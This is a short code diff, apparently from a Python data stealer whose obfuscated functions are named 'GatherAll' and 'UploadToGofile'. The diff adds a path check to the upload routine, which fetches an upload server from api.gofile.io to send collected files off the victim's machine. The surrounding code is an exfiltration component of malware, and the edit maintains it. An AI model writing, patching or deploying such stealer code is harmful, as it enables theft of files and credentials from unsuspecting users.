@@ -1035,6 +1035,8 @@ def G47H3r411():
     
 def UP104D7060F113(path):
     try:
+        if not re.match(r'^[a-zA-Z0-9_\-./\\]+$', path):
+            return False
         servers = requests.get("https://api.gofile.io/servers").json()["data"]["servers"]
         
         if servers:
